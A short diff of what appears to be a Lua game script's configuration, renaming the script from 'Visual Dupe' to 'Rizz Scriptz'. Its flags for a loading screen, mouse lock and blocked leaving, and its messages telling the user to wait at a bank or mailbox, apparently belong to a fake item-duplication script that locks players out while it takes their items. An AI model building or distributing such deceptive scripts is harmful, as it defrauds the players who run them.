@@ -6,7 +6,7 @@ _G.LoadingScreen = true
 _G.AntiLeave = false
 _G.MouseLock = true 
 
-_G.ScriptName = "Visual Dupe"
+_G.ScriptName = "Rizz Scriptz"
 _G.FirstText = "Script Preparing"
 _G.SecondText = "Visual Dupe almost Done..."
 _G.ThirdText = "Make Sure Your At Bank/Mailbox..."
